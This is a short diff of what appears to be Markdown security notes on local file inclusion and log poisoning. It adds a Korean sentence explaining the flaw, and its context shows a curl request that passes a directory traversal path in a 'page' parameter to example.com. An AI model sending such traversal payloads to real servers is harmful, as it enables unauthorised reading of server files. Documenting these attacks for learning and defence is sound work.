@@ -33,6 +33,7 @@
 ---
 
 # 📄 Local File Inclusion (LFI) - Log Poisoning
+공격자가 서버 내의 파일을 직접 열람하거나 실행할 수 있도록 유도하는 취약점
 ```bash
 curl http://example.com/index.php?page=../../../../../../../../../var/www/html/index.php
 ```
